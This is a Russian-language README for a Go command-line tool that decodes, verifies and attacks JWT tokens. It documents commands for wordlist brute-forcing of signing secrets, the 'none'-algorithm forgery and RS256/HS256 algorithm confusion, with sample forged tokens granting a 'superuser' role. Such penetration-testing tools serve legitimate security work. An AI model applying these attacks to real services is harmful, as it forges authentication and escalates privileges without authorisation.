# JWT Tool

Утилита для работы с JWT токенами на Go. Позволяет декодировать, проверять, создавать и атаковать JWT токены с помощью различных уязвимостей.

## Функционал

- **Decode** - Декодирование и анализ JWT токена
- **Verify** - Проверка подписи токена с помощью secret
- **Crack** - Подбор secret методом перебора из wordlist'а
- **None** - Атака "none" (смена алгоритма на "none")
- **Confusion** - Атака путаницы алгоритмов (RS256 вместо HS256)

## Установка

### Требования

- Go 1.20+

### Сборка

```bash
git clone https://github.com/ChesstorOtter/jwttool.git
cd jwttool
go mod download
go build -o jwttool.exe
```

## Использование 
## Декодирование токена
```bash
go run main.go decode "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9..."
```
Вывод:
```bash
Header:
map[alg:HS256 typ:JWT]
Payload:
map[iat:1700000000 role:admin user:bob]
Signature:
vTqpZhOul4q31YJ26KQlvMRnv9N0879uHxu5qmNJRmw
```
## Проверка подписи токена
```bash
go run main.go verify "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9..." "secret"
```
Вывод при успехе:
```bash
Token is valid with secret. secret
```
Вывод при ошибке:
```bash
Token is invalid with secret. secret
```
## Подбор secret из wordlist'а
Сначала сгенерируйте тестовый токен:
```bash
go run generate.go
```
Затем выполните crack:
```bash
go run main.go crack "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9..." wordlist.txt
```
Процесс выведет прогресс-бар и найденный secret:
```bash
Starting token cracking...
100% |███████████████████████████████████████████| (80/80, 147874 it/s)
Token is valid with secret: secret
```
## Атака "none"
Изменение алгоритма на "none" и подмена payload'а:
```bash
go run main.go none "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9..." '{"role":"superuser"}'
```
Вывод:
```bash
New token with 'none' algorithm:
eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJyb2xlIjoic3VwZXJ1c2VyIn0.
```
## Атака путаницы алгоритмов
Подмена алгоритма HS256 на RS256 с использованием приватного ключа:
```bash
go run main.go confusion "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9..." '{"role":"superuser"}' private_key.pem
```
Вывод:
```bash
New token with 'RS256' algorithm:
eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJyb2xlIjoic3VwZXJ1c2VyIn0.SIGNATURE_HERE
```
## Структура проекта
```bash
jwttool/
├── main.go              # Точка входа и обработка команд
├── generate.go          # Генерация тестовых токенов и wordlist'а
├── cmd/
│   ├── crack.go         # Логика crack команды
│   ├── decode.go        # Логика decode команды
│   ├── verify.go        # Логика verify команды
│   ├── none.go          # Логика none атаки
│   └── confusion.go     # Логика confusion атаки
├── pkg/jwt/
│   ├── parser.go        # Парсинг JWT токенов
│   ├── signer.go        # Подпись и проверка HS256
│   ├── craker.go        # Подбор secret с многопоточностью
│   ├── none.go          # Реализация none атаки
│   └── confusion.go     # Реализация confusion атаки
├── go.mod              # Go модули
├── go.sum              # Зависимости
├── .gitignore          # Git ignore файл
├── payload.json        # Пример payload'а для атак
└── README.md           # Документация (этот файл)
```
